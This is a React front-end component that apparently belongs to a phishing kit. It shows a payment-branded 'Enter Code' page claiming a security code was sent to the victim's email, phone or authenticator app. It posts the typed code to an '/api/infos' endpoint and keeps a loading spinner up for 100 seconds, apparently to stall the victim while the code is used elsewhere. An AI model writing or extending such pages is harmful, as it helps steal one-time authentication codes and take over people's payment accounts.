import React, { useContext, useState } from 'react'
import Loader from '../components/Loader'
import { LoaderContext } from '../contexts/LoaderContext';
import { apiFetch } from '../components/fetchIn';

const InputCode = () => {
    const [code, setCode] = useState("");

    const { setShowLoader } = useContext(LoaderContext);

    const useLoader = async (mil) => {
        setShowLoader(true);

        await new Promise((resolve) => setTimeout(resolve, mil));

        setShowLoader(false);
    };


    const saveDetail = async (e) => {
        e.preventDefault();
        useLoader(100000);
        try {
            const res = await apiFetch('/api/infos', {
                method: 'POST',
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ code })
            })
            if (!res.ok) {
                alert('Error From server');
                return;
            }

        } catch (err) {
            console.log("Error adding user: " + err)
        }
    }

    return (
        <div className="w-100 min-h-screen flex flex-col gap-2 justify-center">

            <img src='/images/payLogo.png' className='mx-auto w-32 object-cover' />
            <h2 className='font-extrabold text-2xl font-[Inter] text-center'>Enter Code</h2>
            <p className='text-sm text-center'>We sent a security code to your email and number / authenticator app</p>
            <form onSubmit={saveDetail}>
                <div className="space-y-7">
                    <input
                        type="text"
                        value={code}
                        required
                        onChange={(e) => setCode(e.target.value)}
                        placeholder="Code"
                        className="w-full px-4 py-5 font-bold border rounded-md focus:outline-none focus:border-2 focus:border-blue-600 focus:bg-blue-100 font-[Quicksand]"
                    />

                    <button className="w-full bg-blue-700 text-white py-3 rounded-3xl font-medium hover:bg-blue-600 transition cursor-pointer">
                        Submit
                    </button>
                </div>
            </form>

        </div>
    )
}

export default InputCode